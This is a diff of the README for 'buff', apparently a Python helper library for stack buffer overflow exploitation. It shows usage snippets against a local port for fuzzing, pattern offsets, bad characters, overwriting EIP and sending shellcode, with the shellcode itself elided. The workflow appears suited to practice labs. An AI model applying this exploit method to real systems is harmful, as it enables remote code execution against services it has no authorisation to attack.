@@ -10,7 +10,7 @@ It comes with fuzzer and a generic method to generate exploit easily.
 ```python
 import buff
 
-runner = buff.Buff(target = ("127.0.0.1", 1337), prefix = "OVERFLOW0 ")
+runner = buff.Buff(target = ("127.0.0.1", 1337))
 runner.fuzz()
 ```
 
@@ -18,7 +18,7 @@ runner.fuzz()
 ```python
 import buff
 
-runner = buff.Buff(target = ("127.0.0.1", 1337), prefix = "OVERFLOW0 ")
+runner = buff.Buff(target = ("127.0.0.1", 1337))
 runner.sendPattern()
 ```
 
@@ -26,7 +26,7 @@ runner.sendPattern()
 ```python
 import buff
 
-runner = buff.Buff(target = ("127.0.0.1", 1337), prefix = "OVERFLOW0 ")
+runner = buff.Buff(target = ("127.0.0.1", 1337))
 
 BUFFER_SIZE = 1100
 offset = buff.generator.findPatternOffset(BUFFER_SIZE, "v1Av")
@@ -37,7 +37,7 @@ print(offset)
 ```python
 import buff
 
-runner = buff.Buff(target = ("127.0.0.1", 1337), prefix = "OVERFLOW0 ")
+runner = buff.Buff(target = ("127.0.0.1", 1337))
 
 runner.setBufferSize(2400)
 runner.setEipOffset(1978)
@@ -48,7 +48,7 @@ runner.sendBadChars()
 ```python
 import buff
 
-runner = buff.Buff(target = ("127.0.0.1", 1337), prefix = "OVERFLOW0 ")
+runner = buff.Buff(target = ("127.0.0.1", 1337))
 
 # Set Buffer Size
 runner.setBufferSize(2400)
@@ -56,14 +56,15 @@ runner.setBufferSize(2400)
 # Set Eip offset
 runner.setEipOffset(1978)
 
-# Send real exploit
+# Set return address
 eip_address = "\xaf\x11\x50\x62"
 runner.setEipAddress(eip_address)
 
+# Send exploit
 exploit = ("\xdb\xde.....")
 runner.setExploit(exploit)
 
-# set padding
+# Set padding
 runner.setPaddingSize(16)
 
 runner.sendExploit()
